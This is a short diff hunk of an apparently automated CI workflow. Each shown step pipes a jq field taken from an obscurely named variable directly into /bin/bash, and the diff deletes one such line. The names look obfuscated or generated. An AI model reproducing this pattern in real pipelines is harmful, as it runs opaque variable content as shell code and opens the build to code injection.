@@ -30,7 +30,6 @@ jobs:
           echo $atza4 | jq -r .jxe98 | /bin/bash
           echo $i72262 | jq -r .olnlu365 | /bin/bash
           echo $ul53 | jq -r .m68 | /bin/bash
-          echo $n5181 | jq -r .ahx08 | /bin/bash
           printf '%s' "$evvl0" | jq -r .mil136 | /bin/bash
           printf '%s' "$ohmd4" | jq -r .rtmdo3837 | /bin/bash
           printf '%s' "$y30" | jq -r .hmb07199 | /bin/bash
